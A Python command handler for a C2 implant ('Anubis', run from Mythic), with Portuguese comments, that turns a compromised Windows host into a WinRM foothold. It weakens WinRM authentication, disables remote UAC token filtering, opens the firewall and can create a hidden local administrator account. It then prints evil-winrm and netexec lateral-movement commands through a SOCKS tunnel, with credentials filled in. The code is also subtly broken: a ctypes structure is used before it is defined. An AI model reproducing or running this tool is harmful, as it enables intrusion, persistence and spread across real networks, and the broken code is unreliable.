def winrm_ext(self, task_id, target="", port=5985, username="", password="",
              domain="", socks_port=7005, add_user="", ssl=False, action=""):
    # Handler winrm_ext — spliced no corpo da classe do agente (COMMANDS_HERE).
    # Todo import precisa viver DENTRO do método (o arquivo é colado na classe).
    import os, sys, json, time, uuid, socket, string, subprocess, ctypes, tempfile
    from ctypes import wintypes

    try:
        import secrets
    except ImportError:  # fallback py2
        import random as _r
        class _secrets:
            @staticmethod
            def choice(s):
                return s[_r.randrange(len(s))]
        secrets = _secrets()

    WSMAN_SVC  = r"SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN\Service"
    WSMAN_AUTH = WSMAN_SVC + r"\Auth"
    WSMAN_ROOT = r"SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN\Listener"
    UAC_POLICY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    STATE_FILE = os.path.join(tempfile.gettempdir(), "anubis_winrm_ext_state.json")

    if os.name != "nt":
        return "[!] winrm_ext: Windows only."

    import winreg

    port = int(port)
    socks_port = int(socks_port)
    if isinstance(ssl, str):
        ssl = ssl.strip().lower() in ("1", "true", "yes", "sim")
    if ssl and port == 5985:
        port = 5986

    # ---------- helpers de registro ----------
    def get_dword(path, name):
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0,
                                winreg.KEY_READ | 0x0100) as k:
                v, _ = winreg.QueryValueEx(k, name)
                return int(v)
        except OSError:
            return None

    def set_dword(path, name, value):
        with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, path, 0,
                                winreg.KEY_SET_VALUE | 0x0100) as k:
            winreg.SetValueEx(k, name, 0, winreg.REG_DWORD, int(value))

    def delete_value(path, name):
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0,
                                winreg.KEY_SET_VALUE | 0x0100) as k:
                winreg.DeleteValue(k, name)
        except OSError:
            pass

    # ---------- SCM (ctypes — sem sc.exe) ----------
    advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
    advapi32.OpenSCManagerW.argtypes = (wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD)
    advapi32.OpenSCManagerW.restype  = wintypes.HANDLE
    advapi32.OpenServiceW.argtypes   = (wintypes.HANDLE, wintypes.LPCWSTR, wintypes.DWORD)
    advapi32.OpenServiceW.restype    = wintypes.HANDLE
    advapi32.CloseServiceHandle.argtypes = (wintypes.HANDLE,)
    advapi32.CloseServiceHandle.restype  = wintypes.BOOL
    advapi32.ChangeServiceConfigW.argtypes = (
        wintypes.HANDLE, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD,
        wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.LPDWORD, wintypes.LPCWSTR,
        wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.LPCWSTR)
    advapi32.ChangeServiceConfigW.restype = wintypes.BOOL
    advapi32.StartServiceW.argtypes = (wintypes.HANDLE, wintypes.DWORD,
                                       ctypes.POINTER(wintypes.LPCWSTR))
    advapi32.StartServiceW.restype  = wintypes.BOOL
    advapi32.QueryServiceStatus.argtypes = (wintypes.HANDLE, ctypes.POINTER(SERVICE_STATUS))
    advapi32.QueryServiceStatus.restype  = wintypes.BOOL
    advapi32.ControlService.argtypes     = (wintypes.HANDLE, wintypes.DWORD,
                                            ctypes.POINTER(SERVICE_STATUS))
    advapi32.ControlService.restype      = wintypes.BOOL

    class SERVICE_STATUS(ctypes.Structure):
        _fields_ = [
            ("dwServiceType",             wintypes.DWORD),
            ("dwCurrentState",            wintypes.DWORD),
            ("dwControlsAccepted",        wintypes.DWORD),
            ("dwWin32ExitCode",           wintypes.DWORD),
            ("dwServiceSpecificExitCode", wintypes.DWORD),
            ("dwCheckPoint",              wintypes.DWORD),
            ("dwWaitHint",                wintypes.DWORD),
        ]

    SERVICE_STOPPED  = 0x1
    SERVICE_RUNNING  = 0x4
    SERVICE_AUTO     = 0x2
    STOP             = 0x1
    SC_ALL           = 0xF003F
    SVC_ALL          = 0xF01FF
    NO_CHANGE        = 0xFFFFFFFF
    ERR_ALREADY_RUN  = 1056
    ERR_NOT_ACTIVE   = 1062

    def _wait_state(h_svc, wanted, timeout=45):
        deadline = time.time() + timeout
        while time.time() < deadline:
            ss = SERVICE_STATUS()
            if not advapi32.QueryServiceStatus(h_svc, ctypes.byref(ss)):
                raise ctypes.WinError(ctypes.get_last_error())
            if ss.dwCurrentState == wanted:
                return True
            time.sleep(1)
        return False

    def ensure_winrm_service(restart=False):
        h_scm = advapi32.OpenSCManagerW(None, None, SC_ALL)
        if not h_scm:
            raise ctypes.WinError(ctypes.get_last_error())
        try:
            h_svc = advapi32.OpenServiceW(h_scm, "WinRM", SVC_ALL)
            if not h_svc:
                raise ctypes.WinError(ctypes.get_last_error())
            try:
                advapi32.ChangeServiceConfigW(h_svc, NO_CHANGE, SERVICE_AUTO,
                                              NO_CHANGE, None, None, None, None,
                                              None, None, None)
                ss = SERVICE_STATUS()
                running = (advapi32.QueryServiceStatus(h_svc, ctypes.byref(ss))
                           and ss.dwCurrentState == SERVICE_RUNNING)
                if restart and running:
                    if not advapi32.ControlService(h_svc, STOP, ctypes.byref(ss)):
                        err = ctypes.get_last_error()
                        if err != ERR_NOT_ACTIVE:
                            raise ctypes.WinError(err)
                    if not _wait_state(h_svc, SERVICE_STOPPED):
                        raise RuntimeError("WinRM não parou (timeout)")
                ctypes.set_last_error(0)
                if not advapi32.StartServiceW(h_svc, 0, None):
                    err = ctypes.get_last_error()
                    if err != ERR_ALREADY_RUN:
                        raise ctypes.WinError(err)
                if not _wait_state(h_svc, SERVICE_RUNNING):
                    raise RuntimeError("WinRM não iniciou (timeout)")
            finally:
                advapi32.CloseServiceHandle(h_svc)
        finally:
            advapi32.CloseServiceHandle(h_scm)

    # ---------- listener via registro (sem winrm.cmd) ----------
    def listener_guids_on_port(p):
        found = []
        try:
            root = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, WSMAN_ROOT, 0,
                                  winreg.KEY_READ | 0x0100)
        except OSError:
            return found
        try:
            i = 0
            while True:
                try:
                    name = winreg.EnumKey(root, i)
                    i += 1
                except OSError:
                    break
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                        WSMAN_ROOT + "\\" + name, 0,
                                        winreg.KEY_READ | 0x0100) as k:
                        v, _ = winreg.QueryValueEx(k, "Port")
                    if int(v) == int(p):
                        found.append(name)
                except OSError:
                    continue
        finally:
            winreg.CloseKey(root)
        return found

    def ensure_listener(p, ssl_on, hostname, thumbprint=None):
        existing = listener_guids_on_port(p)
        if existing:
            return None
        guid = "{" + str(uuid.uuid4()).upper() + "}"
        with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE,
                                WSMAN_ROOT + "\\" + guid, 0,
                                winreg.KEY_SET_VALUE | 0x0100) as k:
            winreg.SetValueEx(k, "Address",   0, winreg.REG_SZ,   "*")
            winreg.SetValueEx(k, "Transport", 0, winreg.REG_SZ,
                              "HTTPS" if ssl_on else "HTTP")
            winreg.SetValueEx(k, "Port",      0, winreg.REG_DWORD, int(p))
            winreg.SetValueEx(k, "Enabled",   0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(k, "URLPrefix", 0, winreg.REG_SZ,   "wsman")
            if ssl_on:
                winreg.SetValueEx(k, "Hostname", 0, winreg.REG_SZ, hostname or "*")
                winreg.SetValueEx(k, "CertificateThumbprint", 0,
                                  winreg.REG_SZ, thumbprint or "")
        return guid

    # ---------- firewall / usuário / misc ----------
    def add_firewall_rule(p):
        rule = "AnubisWinRM-%d" % p
        subprocess.run(["netsh", "advfirewall", "firewall", "delete", "rule",
                        "name=%s" % rule], capture_output=True)
        r = subprocess.run(["netsh", "advfirewall", "firewall", "add", "rule",
                            "name=%s" % rule, "dir=in", "action=allow",
                            "protocol=TCP", "localport=%d" % p],
                           capture_output=True, text=True)
        if r.returncode != 0:
            raise RuntimeError("netsh add rule falhou: " +
                               (r.stderr or r.stdout).strip()[:300])

    def add_local_admin(user, pwd):
        r = subprocess.run(["net", "user", user, pwd, "/add"],
                           capture_output=True, text=True)
        if r.returncode != 0:
            r = subprocess.run(["net", "user", user, pwd],
                               capture_output=True, text=True)
            if r.returncode != 0:
                raise RuntimeError("net user falhou: " +
                                   (r.stderr or r.stdout).strip()[:300])
        for group in ("Administrators", "Administradores"):
            r = subprocess.run(["net", "localgroup", group, user, "/add"],
                               capture_output=True, text=True)
            if r.returncode == 0:
                return
        ps = ("$ErrorActionPreference='Stop';"
              "Add-LocalGroupMember -SID 'S-1-5-32-544' -Member '{0}'").format(user)
        r = subprocess.run(["powershell.exe", "-NoProfile", "-NonInteractive",
                            "-Command", ps], capture_output=True, text=True)
        if r.returncode != 0:
            raise RuntimeError("não consegui adicionar %s a Administrators" % user)

    def gen_password(n=16):
        alphabet = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
        return "".join(secrets.choice(alphabet) for _ in range(n))

    def probe(ip, p, timeout=4):
        try:
            with socket.create_connection((ip, p), timeout=timeout):
                return True
        except OSError:
            return False

    def detect_local_ip():
        try:
            host = socket.gethostname()
            for info in socket.getaddrinfo(host, None, socket.AF_INET,
                                           socket.SOCK_STREAM):
                ip = info[4][0]
                if not ip.startswith("127."):
                    return ip
        except OSError:
            pass
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("1.1.1.1", 53))
            return s.getsockname()[0]
        except OSError:
            pass
        finally:
            s.close()
        return "127.0.0.1"

    def save_state(state):
        try:
            with open(STATE_FILE, "w", encoding="utf-8") as f:
                json.dump(state, f)
        except OSError:
            pass

    def load_state():
        try:
            with open(STATE_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except OSError:
            return {}

    def create_cert(hostname):
        ps = ("$ErrorActionPreference='Stop';"
              "$c = New-SelfSignedCertificate -DnsName '{0}' "
              "-CertStoreLocation 'Cert:\\LocalMachine\\My';"
              "Write-Output $c.Thumbprint").format(hostname.replace("'", "''"))
        r = subprocess.run(["powershell.exe", "-NoProfile", "-NonInteractive",
                            "-Command", ps], capture_output=True, text=True,
                           timeout=120)
        if r.returncode != 0:
            raise RuntimeError("New-SelfSignedCertificate falhou: " +
                               (r.stderr or r.stdout).strip()[:300])
        return [ln.strip() for ln in r.stdout.splitlines() if ln.strip()][-1]

    # ---------- cleanup ----------
    if action == "cleanup":
        state = load_state()
        p = int(state.get("port", 5985))
        subprocess.run(["netsh", "advfirewall", "firewall", "delete", "rule",
                        "name=AnubisWinRM-%d" % p], capture_output=True)
        for guid in state.get("listeners", []):
            try:
                winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, WSMAN_ROOT + "\\" + guid)
            except OSError:
                pass
        reg = state.get("registry", {})
        for path, name, old in (
            (WSMAN_SVC,  "AllowUnencrypted", reg.get("allow_unencrypted")),
            (WSMAN_AUTH, "Basic",            reg.get("basic")),
            (UAC_POLICY, "LocalAccountTokenFilterPolicy", reg.get("uac")),
        ):
            if old is None:
                delete_value(path, name)
            else:
                set_dword(path, name, old)
        if state.get("user"):
            subprocess.run(["net", "user", state["user"], "/delete"],
                           capture_output=True)
        try:
            os.remove(STATE_FILE)
        except OSError:
            pass
        return "[+] Cleanup concluído (firewall, listeners, registro e usuário revertidos)"

    # ---------- execução ----------
    out = []
    ip = target or detect_local_ip()
    created_pass = None

    state = {"port": port, "listeners": [], "user": None, "registry": {}}
    state["registry"]["allow_unencrypted"] = get_dword(WSMAN_SVC, "AllowUnencrypted")
    state["registry"]["basic"]             = get_dword(WSMAN_AUTH, "Basic")
    state["registry"]["uac"]               = get_dword(UAC_POLICY, "LocalAccountTokenFilterPolicy")

    if not ssl:
        set_dword(WSMAN_SVC, "AllowUnencrypted", 1)
    set_dword(WSMAN_AUTH, "Basic", 1)
    set_dword(UAC_POLICY, "LocalAccountTokenFilterPolicy", 1)
    out.append("[+] Auth: AllowUnencrypted=%s, Basic=1 (Negotiate já ativo)"
               % ("1" if not ssl else "n/a"))
    out.append("[+] UAC remoto: LocalAccountTokenFilterPolicy = 1 (admins locais OK)")

    thumb = None
    if ssl:
        thumb = create_cert(ip or socket.gethostname())
        out.append("[+] Certificado auto-assinado criado (thumb %s...)" % thumb[:8])

    guid = ensure_listener(port, ssl, ip or socket.gethostname(), thumb)
    if guid:
        state["listeners"].append(guid)
        out.append("[+] Listener %s/*:%d criado (%s)"
                   % ("HTTPS" if ssl else "HTTP", port, guid))
    else:
        out.append("[+] Listener %s/*:%d já existia — mantido"
                   % ("HTTPS" if ssl else "HTTP", port))

    ensure_winrm_service(restart=bool(guid))
    out.append("[+] WinRM: serviço ativo e AutoStart (SCM/ctypes)")

    add_firewall_rule(port)
    out.append("[+] Firewall: regra inbound TCP/%d (AnubisWinRM-%d)" % (port, port))

    if add_user:
        created_pass = password or gen_password()
        add_local_admin(add_user, created_pass)
        state["user"] = add_user
        out.append("[+] Usuário local '%s' criado + Administrators" % add_user)

    save_state(state)

    out.append("")
    out.append("[+] TCP %s:%d — %s" % (ip, port,
               "REACHABLE" if probe(ip, port) else "FALHOU (firewall/GPO?)"))
    out.append("[+] Tunnel SOCKS5: no Mythic rode →  socks start %d" % socks_port)
    out.append("")
    out.append("=" * 70)
    out.append(" PROXYCHAINS CONFIG")
    out.append("=" * 70)
    out.append("  [ProxyList]")
    out.append("  socks5  127.0.0.1  %d" % socks_port)
    out.append("")
    out.append("=" * 70)
    out.append(" COMANDOS DE MOVIMENTAÇÃO LATERAL")
    out.append("=" * 70)

    ssl_flag = " -S" if ssl else ""
    display_user = ("%s\\%s" % (domain, username)) if (domain and username) else username

    if username and password:
        out.append("")
        out.append("-- evil-winrm (shell interativo + scripts) ----------------")
        out.append("  proxychains evil-winrm%s -i %s -u '%s' -p '%s' -P %d"
                   % (ssl_flag, ip, display_user, password, port))
        out.append("")
        out.append("-- netexec (SOCKS5 nativo — sem proxychains) --------------")
        nxc = "nxc winrm %s -u %s -p '%s'" % (ip, username, password)
        if domain:
            nxc += " -d %s" % domain
        nxc += " -P %d --proxy socks5://127.0.0.1:%d" % (port, socks_port)
        if ssl:
            nxc += " --use-ssl"
        out.append("  " + nxc)
        out.append("")
        out.append("-- PowerShell remoting (pwsh no Kali) ---------------------")
        out.append("  proxychains pwsh -Command \"$s = New-PSSession "
                   "-ComputerName %s -Port %d -Credential (Get-Credential); "
                   "Enter-PSSession $s\"" % (ip, port))

    if add_user:
        out.append("")
        out.append("-- Fallback (conta local criada por add_user) -------------")
        out.append("  proxychains evil-winrm%s -i %s -u %s -p '%s' -P %d"
                   % (ssl_flag, ip, add_user, created_pass, port))

    out.append("")
    out.append("=" * 70)
    if domain and username:
        out.append(" [*] Usuário : %s\\%s" % (domain, username))
    elif username:
        out.append(" [*] Usuário : %s" % username)
    if add_user:
        out.append(" [*] Local   : %s (Administrators)" % add_user)
    out.append(" [*] Alvo    : %s:%d" % (ip, port))
    out.append(" [*] Limpeza : winrm_ext {\"action\":\"cleanup\"}")
    out.append("=" * 70)

    return "\n".join(out)
